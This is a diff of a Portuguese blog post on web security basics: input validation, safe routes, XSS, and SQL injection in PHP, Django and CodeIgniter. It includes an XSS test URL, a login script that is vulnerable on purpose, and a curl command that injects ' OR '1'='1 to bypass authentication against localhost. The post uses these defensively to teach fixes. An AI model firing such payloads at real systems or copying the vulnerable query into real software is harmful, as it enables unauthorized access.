+passado. Os <em>frameworks</em> diminuem muito estes pontos, por isso vale a
+pena o seu uso.</p>
+<h2>Validações (nunca confie no usuário)</h2>
+<p>Como eu comecei com o <a href="/tag/php.html" title="Leia mais sobre PHP"><em>PHP</em></a>, sei muito bem que este é um problema
+comum em aplicações desenvolvidas por iniciantes.</p>
+<p><strong>Nunca confie no usuário</strong>, e principalmente <strong>nunca confie em
+validações realizadas pelo <a href="/tag/javascript.html" title="Leia mais sobre Javascript"><em>Javascript</em></a></strong>. Todo ponto de entrada de
+informação deve possuir uma validação no <em>server-side</em>, mesmo que exista
+uma validação no <em>client-side</em>. <strong>Lembre-se:</strong> Existem navegadores que
+não utilizam <em>Javascript</em>, e mesmo os que utilizam, permitem que o
+usuário desabilite esta função.</p>
+<p>No <em>Django</em>, podemos fazer validações de formulários através de
+<a href="https://docs.djangoproject.com/en/dev/topics/forms/" title="Conheça os Forms no Django"><em>Forms</em></a>. No <em>Codeigniter</em> fazemos através da <a href="http://codeigniter.com/user_guide/libraries/form_validation.html" title="Veja como fazer validações de formulário no Codeigniter"><em>Form Validation Class</em></a>.
+Em <em>PHP</em> “puro”, podemos fazer validações através da <a href="http://pear.php.net/manual/en/package.validate.validate.intro.php" title="Instale a Validate através da PEAR">biblioteca <em>Validate</em></a>.</p>
+<p>As ferramentas citadas acima são extremamente eficientes para ações
+realizadas via <em>POST</em>. Mas e quando temos parâmetros vindos da <em>URL</em>,
+através do método <em>GET</em>, qual é a melhor maneira de agirmos?</p>
+<h3>URLs seguras e amigáveis</h3>
+<p>Há um bom tempo que as “URLs amigáveis” deixaram de ser um diferencial
+nas aplicações <em>web</em> e tornaram-se item obrigatório. Além de trazer o
+benefício do <a href="http://pt.wikipedia.org/wiki/Otimiza%C3%A7%C3%A3o_para_motores_de_busca" title="Leia mais sobre SEO no Wikipedia"><em>SEO</em></a>, elas podem ser uma grande aliada quando o
+assunto é segurança.</p>
+<p><em>URLs</em> que antes eram feitas dessa maneira:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">/blog.php?year=2012&amp;month=12&amp;day=21</code></pre></div>
+<p>Podem ser reproduzidas desta forma:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">/blog/2012/12/21/</code></pre></div>
+<p>O mecanismo de rotas de alguns <em>frameworks</em> permite a utilização de
+expressões regulares na construção do caminho. Por exemplo, em <em>Django</em>
+temos o seguinte cenário:</p>
+<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token comment"># urls.py</span>
 
-<span class=n>urlpatterns</span> <span class=o>=</span> <span class=n>patterns</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span>
-    <span class=o>...</span>
-    <span class=p>(</span><span class=sa>r</span><span class=s1>&#39;^blog/(?P&lt;year&gt;\d{4})/(?P&lt;month&gt;[0-9]{2})/(?P&lt;day&gt;\d{2})/$&#39;</span><span class=p>,</span> <span class=s1>&#39;blog.views.index&#39;</span><span class=p>),</span>
-    <span class=o>...</span>
-<span class=p>)</span>
-</pre></div> <p>Determinamos que a rota inicia-se por <code>blog</code>, sendo composta por um valor numérico de 4 dígitos que atende pelo identificador <code>year</code>, outro valor de dois dígitos, indo de 0 a 9, chamado <code>month</code>, e o último um valor numérico de 2 dígitos chamado <code>day</code>.</p> <p>A verificação é feita no momento da requisição. Se a rota informada bater com o padrão criado, ele executa a <em>view</em> <code>blog.views</code>. Caso contrário, se a rota não bater com nenhum padrão informado (por exemplo, <code>/blog/2012/aa/21/</code>), o usuário tomará um erro 404.</p> <p>Em nossa <em>view</em>, resgataríamos esses valores da seguinte forma:</p> <div class=highlight><pre><span></span><span class=c1># blog/views.py</span>
+urlpatterns <span class="token operator">=</span> patterns<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">(</span><span class="token string">r'^blog/(?P&lt;year>\d{4})/(?P&lt;month>[0-9]{2})/(?P&lt;day>\d{2})/$'</span><span class="token punctuation">,</span> <span class="token string">'blog.views.index'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">)</span></code></pre></div>
+<p>Determinamos que a rota inicia-se por <code class="language-text">blog</code>, sendo composta por um
+valor numérico de 4 dígitos que atende pelo identificador <code class="language-text">year</code>,
+outro valor de dois dígitos, indo de 0 a 9, chamado <code class="language-text">month</code>, e o
+último um valor numérico de 2 dígitos chamado <code class="language-text">day</code>.</p>
+<p>A verificação é feita no momento da requisição. Se a rota informada
+bater com o padrão criado, ele executa a <em>view</em> <code class="language-text">blog.views</code>. Caso
+contrário, se a rota não bater com nenhum padrão informado (por exemplo,
+<code class="language-text">/blog/2012/aa/21/</code>), o usuário tomará um erro 404.</p>
+<p>Em nossa <em>view</em>, resgataríamos esses valores da seguinte forma:</p>
+<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token comment"># blog/views.py</span>
 
-<span class=k>def</span> <span class=nf>index</span><span class=p>(</span><span class=n>request</span><span class=p>,</span> <span class=n>year</span><span class=p>,</span> <span class=n>month</span><span class=p>,</span> <span class=n>day</span><span class=p>):</span>
-    <span class=c1># Lógica de renderização...</span>
-</pre></div> <p>Simples assim! Temos um “input” de informação através de <em>GET</em>, onde temos certeza do seu tipo e tamanho.</p> <p>O mesmo resultado pode ser obtido com o <em>Codeigniter</em>, basta adicionar a expressão desejada em seu <code>application/config/routes.php</code>:</p> <div class=highlight><pre><span></span><span class=x># application/config/routes.php</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> year<span class="token punctuation">,</span> month<span class="token punctuation">,</span> day<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># Lógica de renderização...</span></code></pre></div>
+<p>Simples assim! Temos um “input” de informação através de <em>GET</em>, onde
+temos certeza do seu tipo e tamanho.</p>
+<p>O mesmo resultado pode ser obtido com o <em>Codeigniter</em>, basta adicionar a
+expressão desejada em seu <code class="language-text">application/config/routes.php</code>:</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token shell-comment comment"># application/config/routes.php</span>
 
-<span class=x>$route[&#39;blog/(\d{4})/([0-9]{2})/(\d{2})&#39;] = &quot;blog/index/$1/$2/$3&quot;;</span>
-</pre></div> <p>Aos invés de utilizarmos identificadores, utilizamos a ordem dos grupos criados na expressão regular.</p> <p>Você não precisa utilizar um <em>framework</em> para ter um esquema de rotas como ilustrado acima. Um resultado parecido pode ser atingido através do <a href=https://klauslaube.com.br/tag/nginx.html title="Leia mais sobre Nginx"><em>Nginx</em></a> e do <em>Apache</em> com <em>mod-rewrite</em>. <a href=http://stackoverflow.com/questions/812571/how-to-create-friendly-url-in-php title="Como criar rotas para arquivos PHP com o Apache">Veja um exemplo de uso</a> apresentado numa <em>thread</em> do <em>Stack Overflow</em>.</p> <p>É claro que verificações mais complexas, como por exemplo, se o nome do usuário informado na <em>URL</em> é válido, necessitam de regras específicas, muito provavelmente escritas dentro da <em>view</em>. Um ponto de falha que vale ressaltar é a criação de expressões regulares “genéricas”, que não discriminam o tipo e tamanho dos valores informados.</p> <h3>Verificação de tipos de dados</h3> <p>Mas e quando não temos como fugir de um valor passado via <em>GET</em>? Pode acontecer! Por exemplo, em paginações (onde normalmente passamos um valor <code>page</code> como parâmetro), ou em uma busca (onde passamos o valor pesquisado via <em>GET</em>).</p> <p>Nesse caso, “forçamos” o tipo do dado informado, e diminuímos problemas de interpretação do nosso código:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span>
+<span class="token variable">$route</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'blog/(\d{4})/([0-9]{2})/(\d{2})'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"blog/index/<span class="token interpolation"><span class="token variable">$1</span></span>/<span class="token interpolation"><span class="token variable">$2</span></span>/<span class="token interpolation"><span class="token variable">$3</span></span>"</span><span class="token punctuation">;</span></code></pre></div>
+<p>Aos invés de utilizarmos identificadores, utilizamos a ordem dos grupos
+criados na expressão regular.</p>
+<p>Você não precisa utilizar um <em>framework</em> para ter um esquema de rotas
+como ilustrado acima. Um resultado parecido pode ser atingido através do
+<a href="/tag/nginx.html" title="Leia mais sobre Nginx"><em>Nginx</em></a> e do <em>Apache</em> com <em>mod-rewrite</em>. <a href="http://stackoverflow.com/questions/812571/how-to-create-friendly-url-in-php" title="Como criar rotas para arquivos PHP com o Apache">Veja um exemplo de uso</a>
+apresentado numa <em>thread</em> do <em>Stack Overflow</em>.</p>
+<p>É claro que verificações mais complexas, como por exemplo, se o nome do
+usuário informado na <em>URL</em> é válido, necessitam de regras específicas,
+muito provavelmente escritas dentro da <em>view</em>. Um ponto de falha que
+vale ressaltar é a criação de expressões regulares “genéricas”, que não
+discriminam o tipo e tamanho dos valores informados.</p>
+<h3>Verificação de tipos de dados</h3>
+<p>Mas e quando não temos como fugir de um valor passado via <em>GET</em>? Pode
+acontecer! Por exemplo, em paginações (onde normalmente passamos um
+valor <code class="language-text">page</code> como parâmetro), ou em uma busca (onde passamos o valor
+pesquisado via <em>GET</em>).</p>
+<p>Nesse caso, “forçamos” o tipo do dado informado, e diminuímos problemas
+de interpretação do nosso código:</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-<span class=nv>$page</span> <span class=o>=</span> <span class=nb>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>preg_match</span><span class=p>(</span><span class=s1>&#39;/^\d+$/&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=mi>1</span><span class=p>;</span>
+<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^\d+$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>
 
-<span class=cp>?&gt;</span><span class=x></span>
-</pre></div> <p>A solução acima não é infalível, mas é uma maneira de diminuírmos a incidência de erros. Se um valor diferente de inteiro positivo for passado, a página a ser exibida será a primeira.</p> <h2>XSS – Cross-Site Scripting (não confie na informação)</h2> <p>É certo que, validando toda e qualquer informação que a sua aplicação receber, você diminuirá muito a ocorrência de problemas. Mas, mesmo confiando no tipo e nas dimensões da informação, não podemos confiar no seu conteúdo.</p> <p>Imagine que você possua um <em>blog</em>. Só você pode escrever artigos nele, então você conhece o conteúdo da informação sendo produzida. Certo dia você resolve que os usuários poderão comentar no seu <em>blog</em>, e desenvolve uma ferramenta de comentários com todas as validações citadas anteriormente.</p> <p>Até que em certo momento, um usuário mal-intencionado <strong>escreve um comentário</strong> no seu <em>post</em>, e neste comentário existe um <strong><em>script</em></strong> <em>Javascript</em> que explora uma <strong>falha de segurança</strong> do <em>ActiveX</em> (por exemplo). Logo, todos os leitores que utilizam <em>Internet Explorer</em> e leram o seu <em>post</em> são infectados por um <em>malware</em> que o seu <em>blog</em> ajudou a proliferar.</p> <p>A injeção de um <em>script</em> em um <em>website</em>, através de campos de textos ou passagem de parâmetros, é caracterizado como um ataque de <strong><em>Cross-Site Scripting</em></strong> (ou <em>XSS</em>).</p> <p>Uma maneira muito comum de evitar esse tipo de problema é simplesmente “escapando” ou removendo elementos <em>HTML</em> do conteúdo:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span>
-<span class=c1># xss.php</span>
+<span class="token delimiter important">?></span></span></code></pre></div>
+<p>A solução acima não é infalível, mas é uma maneira de diminuírmos a
+incidência de erros. Se um valor diferente de inteiro positivo for
+passado, a página a ser exibida será a primeira.</p>
+<h2>XSS – Cross-Site Scripting (não confie na informação)</h2>
+<p>É certo que, validando toda e qualquer
+informação que a sua aplicação receber, você diminuirá muito a
+ocorrência de problemas. Mas, mesmo confiando no tipo e nas dimensões da
+informação, não podemos confiar no seu conteúdo.</p>
+<p>Imagine que você possua um <em>blog</em>. Só você pode escrever artigos nele,
+então você conhece o conteúdo da informação sendo produzida. Certo dia
+você resolve que os usuários poderão comentar no seu <em>blog</em>, e
+desenvolve uma ferramenta de comentários com todas as validações citadas
+anteriormente.</p>
+<p>Até que em certo momento, um usuário mal-intencionado <strong>escreve um
+comentário</strong> no seu <em>post</em>, e neste comentário existe um <strong><em>script</em></strong>
+<em>Javascript</em> que explora uma <strong>falha de segurança</strong> do <em>ActiveX</em> (por
+exemplo). Logo, todos os leitores que utilizam <em>Internet Explorer</em> e
+leram o seu <em>post</em> são infectados por um <em>malware</em> que o seu <em>blog</em>
+ajudou a proliferar.</p>
+<p>A injeção de um <em>script</em> em um <em>website</em>, através de campos de textos ou
+passagem de parâmetros, é caracterizado como um ataque de <strong><em>Cross-Site
+Scripting</em></strong> (ou <em>XSS</em>).</p>
+<p>Uma maneira muito comum de evitar esse tipo de problema é simplesmente
+“escapando” ou removendo elementos <em>HTML</em> do conteúdo:</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token shell-comment comment"># xss.php</span>
 
-<span class=nv>$var</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;var&#39;</span><span class=p>];</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-<span class=k>echo</span> <span class=nb>htmlspecialchars</span><span class=p>(</span><span class=nv>$var</span><span class=p>);</span>
+<span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class=cp>?&gt;</span><span class=x></span>
-</pre></div> <p>Acessar <code>xss.php</code> com um <code>alert</code> <em>Javascript</em> como parâmetro, não executará o comando, e sim apenas exibirá o conteúdo na tela, com os caracteres que delimitam o elemento <code>script</code> devidamente formatados:</p> <div class=highlight><pre><span></span>http://localhost/xss.php?var<span class=o>=</span>&lt;script&gt;alert<span class=o>(</span><span class=s2>&quot;XSS!&quot;</span><span class=o>)</span><span class=p>;</span>&lt;/script&gt;
-</pre></div> <p>Existem alguns <a href=http://www.webdesignerdepot.com/2008/12/20-excellent-free-rich-text-editors/ title="Conheça 20 excelentes editores WYSIWYG"><em>Rich Text Editors</em></a> que verificam e formatam o conteúdo do campo antes de uma submissão. Mas <strong>lembre-se</strong>! Editores <em>WYSIWYG</em> são basicamente <em>Javascript</em>, logo, se eu desabilitar o <em>Javascript</em> do meu navegador, posso enviar <em>scripts</em> maliciosos sem impeditivo nenhum, por isso, é sempre necessário fazermos esse tipo de validação no <em>server-side</em>.</p> <p>O <em>Codeigniter</em>, com a opção <code>$config['global_xss_filtering’]</code> como <code>TRUE</code>, filtra automaticamente os dados resgatados de <em>GET</em> ou <em>POST</em>. O que acho bacana desse filtro, é que ele previne apenas a injeção de <em>scripts</em> e atributos que podem de alguma forma prejudicar na segurança da sua aplicação, não necessariamente formatando o conteúdo todo.</p> <p>Este tratamento está ativo por padrão no <em>engine</em> de <em>templates</em> do <em>Django</em>. Embora isso não impeça o armazenamento do <em>script</em> no banco de dados, impede que a sua renderização afete os usuários da sua aplicação.</p> <p>Uma outra forma muito bacana de prevenir este tipo de inconveniente é utilizando uma linguagem de marcação alternativa, como <em>Textile</em> e <em>Markdown</em>, em campos de textos abertos.</p> <h2>SQL Injection (não confie em sua aplicação)</h2> <p>Entre as vulnerabilidades citadas, acredito que o <strong><em>SQL Injection</em></strong> é uma das mais destrutivas, tanto para a sua aplicação, quanto para os seus usuários.</p> <p>Segundo o <em>Wikipedia</em>:</p> <blockquote> <p>É um tipo de ameaça de segurança que se aproveita de falhas em sistemas que interagem com bases de dados via SQL. A injeção de SQL ocorre quando o atacante consegue inserir uma série de instruções SQL dentro de uma consulta (query) através da manipulação das entrada de dados de uma aplicação.</p> </blockquote> <p>Os resultados podem ser os mais desastrosos, como por exemplo, o acesso de usuários não autorizados a áreas restritas, e o roubo de informações da sua base de dados. Abaixo, uma autenticação simples, utilizando nome de usuário e senha:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span>
-<span class=c1># sql-injection.php</span>
+<span class="token delimiter important">?></span></span></code></pre></div>
+<p>Acessar <code class="language-text">xss.php</code> com um <code class="language-text">alert</code> <em>Javascript</em> como parâmetro, não
+executará o comando, e sim apenas exibirá o conteúdo na tela, com os
+caracteres que delimitam o elemento <code class="language-text">script</code> devidamente formatados:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">http://localhost/xss.php?var=&amp;lt;script&amp;gt;alert(&quot;XSS!&quot;);&amp;lt;/script&amp;gt;</code></pre></div>
+<p>Existem alguns <a href="http://www.webdesignerdepot.com/2008/12/20-excellent-free-rich-text-editors/" title="Conheça 20 excelentes editores WYSIWYG"><em>Rich Text Editors</em></a> que verificam e formatam o
+conteúdo do campo antes de uma submissão. Mas <strong>lembre-se</strong>! Editores
+<em>WYSIWYG</em> são basicamente <em>Javascript</em>, logo, se eu desabilitar o
+<em>Javascript</em> do meu navegador, posso enviar <em>scripts</em> maliciosos sem
+impeditivo nenhum, por isso, é sempre necessário fazermos esse tipo de
+validação no <em>server-side</em>.</p>
+<p>O <em>Codeigniter</em>, com a opção <code class="language-text">$config[&#39;global_xss_filtering’]</code> como
+<code class="language-text">TRUE</code>, filtra automaticamente os dados resgatados de <em>GET</em> ou <em>POST</em>.
+O que acho bacana desse filtro, é que ele previne apenas a injeção de
+<em>scripts</em> e atributos que podem de alguma forma prejudicar na segurança
+da sua aplicação, não necessariamente formatando o conteúdo todo.</p>
+<p>Este tratamento está ativo por padrão no <em>engine</em> de <em>templates</em> do
+<em>Django</em>. Embora isso não impeça o armazenamento do <em>script</em> no banco de
+dados, impede que a sua renderização afete os usuários da sua aplicação.</p>
+<p>Uma outra forma muito bacana de prevenir este tipo de inconveniente é
+utilizando uma linguagem de marcação alternativa, como <em>Textile</em> e
+<em>Markdown</em>, em campos de textos abertos.</p>
+<h2>SQL Injection (não confie em sua aplicação)</h2>
+<p>Entre as vulnerabilidades citadas, acredito que o
+<strong><em>SQL Injection</em></strong> é uma das mais
+destrutivas, tanto para a sua aplicação, quanto para os seus usuários.</p>
+<p>Segundo o <em>Wikipedia</em>:</p>
+<blockquote>
+<p>É um tipo de ameaça de segurança que se aproveita de falhas em
+sistemas que interagem com bases de dados via SQL. A injeção de
+SQL ocorre quando o atacante consegue inserir
+uma série de instruções SQL dentro de uma
+consulta (query) através da manipulação das entrada de dados de uma
+aplicação.</p>
+</blockquote>
+<p>Os resultados podem ser os mais desastrosos, como por exemplo, o acesso
+de usuários não autorizados a áreas restritas, e o roubo de informações
+da sua base de dados. Abaixo, uma autenticação simples, utilizando nome
+de usuário e senha:</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token shell-comment comment"># sql-injection.php</span>
 
-<span class=k>if</span> <span class=p>(</span><span class=nb>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;usuario&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;senha&#39;</span><span class=p>]))</span> <span class=p>{</span>
-    <span class=nv>$usuario</span>    <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;usuario&#39;</span><span class=p>];</span>
-    <span class=nv>$senha</span>      <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;senha&#39;</span><span class=p>];</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'usuario'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'senha'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$usuario</span>    <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'usuario'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$senha</span>      <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'senha'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-    <span class=c1>// Abre conexão com o banco de dados</span>
-    <span class=nv>$link</span> <span class=o>=</span> <span class=nb>mysql_connect</span><span class=p>(</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=s1>&#39;root&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
-    <span class=c1>// Seleciona a base de dados</span>
-    <span class=nb>mysql_select_db</span><span class=p>(</span><span class=s1>&#39;exemplos_blog&#39;</span><span class=p>);</span>
+    <span class="token comment">// Abre conexão com o banco de dados</span>
+    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// Seleciona a base de dados</span>
+    <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'exemplos_blog'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class=c1>// Faz a consulta ao banco, comparando usuário e senha</span>
-    <span class=nv>$query</span> <span class=o>=</span> <span class=s2>&quot;SELECT 1 FROM usuario WHERE usuario = &#39;</span><span class=si>{</span><span class=nv>$usuario</span><span class=si>}</span><span class=s2>&#39; &quot;</span>
-        <span class=o>.</span> <span class=s2>&quot;AND senha = &#39;</span><span class=si>{</span><span class=nv>$senha</span><span class=si>}</span><span class=s2>&#39;&quot;</span><span class=p>;</span>
-    <span class=nv>$result</span> <span class=o>=</span> <span class=nb>mysql_query</span><span class=p>(</span><span class=nv>$query</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s2>&quot;Query inválida: &quot;</span>
-        <span class=o>.</span> <span class=nb>mysql_error</span><span class=p>()</span> <span class=o>.</span> <span class=s2>&quot;</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>);</span>
+    <span class="token comment">// Faz a consulta ao banco, comparando usuário e senha</span>
+    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT 1 FROM usuario WHERE usuario = '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$usuario</span><span class="token punctuation">}</span></span>' "</span>
+        <span class="token punctuation">.</span> <span class="token double-quoted-string string">"AND senha = '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$senha</span><span class="token punctuation">}</span></span>'"</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Query inválida: "</span>
+        <span class="token punctuation">.</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class=nb>mysql_close</span><span class=p>(</span><span class=nv>$link</span><span class=p>);</span>
+    <span class="token function">mysql_close</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class=k>if</span> <span class=p>(</span><span class=nb>mysql_num_rows</span><span class=p>(</span><span class=nv>$result</span><span class=p>))</span> <span class=p>{</span>
-        <span class=c1>// Vai para a página logada</span>
-        <span class=k>echo</span> <span class=s1>&#39;Login com sucesso&#39;</span><span class=p>;</span>
-    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-        <span class=c1>// Errou o usuário e senha, volta para a página de login</span>
-        <span class=k>echo</span> <span class=s1>&#39;Usuário e senha inválidos&#39;</span><span class=p>;</span>
-    <span class=p>}</span>
-<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-    <span class=c1>// Vai para a página de login</span>
-<span class=p>}</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment">// Vai para a página logada</span>
+        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Login com sucesso'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token comment">// Errou o usuário e senha, volta para a página de login</span>
+        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Usuário e senha inválidos'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token comment">// Vai para a página de login</span>
+<span class="token punctuation">}</span>
 
-<span class=cp>?&gt;</span><span class=x></span>
-</pre></div> <p>Levando em consideração que temos um usuário com nome <code>teste</code> e senha <code>teste</code>, se executarmos a instrução abaixo, será exibida uma mensagem de <em>login</em> inválido:</p> <div class=highlight><pre><span></span>$ curl --data <span class=s2>&quot;usuario=foo&amp;senha=bar&quot;</span> http://localhost/sql-injection.php
+<span class="token delimiter important">?></span></span></code></pre></div>
+<p>Levando em consideração que temos um usuário com nome <code class="language-text">teste</code> e senha
+<code class="language-text">teste</code>, se executarmos a instrução abaixo, será exibida uma mensagem
+de <em>login</em> inválido:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ curl --data &quot;usuario=foo&amp;senha=bar&quot; http://localhost/sql-injection.php
 
-Usuário e senha inválidos
-</pre></div> <p>Evidente! Este usuário não existe no banco de dados. Mas, podemos imaginar que a aplicação não possua proteção contra injeções <em>SQL</em>, então podemos fazer com que a consulta retorne positivo, e que nosso acesso seja garantido mesmo não possuindo um usuário no banco de dados.</p> <div class=highlight><pre><span></span>$ curl --data <span class=s2>&quot;usuario=foo&amp;senha=bar&#39; OR &#39;1&#39; = &#39;1&quot;</span> http://localhost/sql-injection.php
+Usuário e senha inválidos</code></pre></div>
+<p>Evidente! Este usuário não existe no banco de dados. Mas, podemos
+imaginar que a aplicação não possua proteção contra injeções <em>SQL</em>,
+então podemos fazer com que a consulta retorne positivo, e que nosso
+acesso seja garantido mesmo não possuindo um usuário no banco de dados.</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ curl --data &quot;usuario=foo&amp;senha=bar&#39; OR &#39;1&#39; = &#39;1&quot; http://localhost/sql-injection.php
 
-Login com sucesso
-</pre></div> <p>A nossa <em>query</em>, por não fazermos um tratamento nos campos do formulário, foi composta pelo valor <code>bar’ OR '1’ = ’1</code>, o que resultou no seguinte <em>SQL</em>:</p> <div class=highlight><pre><span></span><span class=k>SELECT</span> <span class=mi>1</span> <span class=k>FROM</span> <span class=n>usuario</span> <span class=k>WHERE</span> <span class=n>usuario</span> <span class=o>=</span> <span class=s1>&#39;foo&#39;</span> <span class=k>AND</span> <span class=n>senha</span> <span class=o>=</span> <span class=s1>&#39;bar&#39;</span> <span class=k>OR</span> <span class=s1>&#39;1&#39;</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span>
-</pre></div> <p>Existem algumas soluções para este problema, como o uso de <code>addslashes</code> no <em>PHP</em>, mas os que fazem mais sentido para mim são:</p> <ul> <li>O uso da função <code>mysql_real_escape_string</code> para formatar dados antes de construir a <em>query</em>;</li> <li>O uso da classe <code>mysqli</code> para consultas a bancos de dados <em>MySQL</em>, ao invés do uso das funções <em>mysql</em>.</li> </ul> <p>A primeira é a mais prática de aplicarmos. No código anterior, bastaria formatar os valores na hora que são resgatados do <em>array</em> <code>$_POST</code>:</p> <div class=highlight><pre><span></span><span class=x>$usuario    = mysql_real_escape_string($_POST[&#39;usuario&#39;]);</span>
-<span class=x>$senha      = mysql_real_escape_string($_POST[&#39;senha&#39;]);</span>
